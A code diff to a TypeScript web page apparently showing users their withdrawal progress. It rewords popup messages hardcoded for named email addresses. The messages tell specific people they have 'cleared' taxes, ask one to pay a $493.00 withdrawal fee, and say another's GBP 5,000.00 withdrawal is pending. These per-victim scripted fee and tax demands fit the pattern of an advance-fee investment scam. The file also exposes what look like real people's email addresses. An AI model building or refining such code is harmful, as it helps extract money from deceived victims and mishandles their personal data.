@@ -414,7 +414,7 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
   ,
   "josiahbauman03@gmail.com":
-    "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is pending admin approval."
+    "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is pending for your transaction to be approved."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -430,7 +430,7 @@ const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
   },
   "josiahbauman03@gmail.com": {
     message:
-      "Congratulations on clearing your taxes. Final step: your withdrawal is pending admin approval. Pending amount: GBP 5,000.00.",
+      "Congratulations on clearing your taxes. Final step: your withdrawal is pending for your transaction to be approved. Pending amount: GBP 5,000.00.",
     appendPendingAmount: false
   },
   "tzahielk@gmail.com": {
@@ -1761,7 +1761,7 @@ export default function ProgressPage() {
       if (userEmailLower === "josiahbauman03@gmail.com") {
         await new Promise((resolve) => window.setTimeout(resolve, 1200));
         setTaxPopup(
-          "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is now pending admin approval."
+          "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is now pending for your transaction to be approved."
         );
         return;
       }
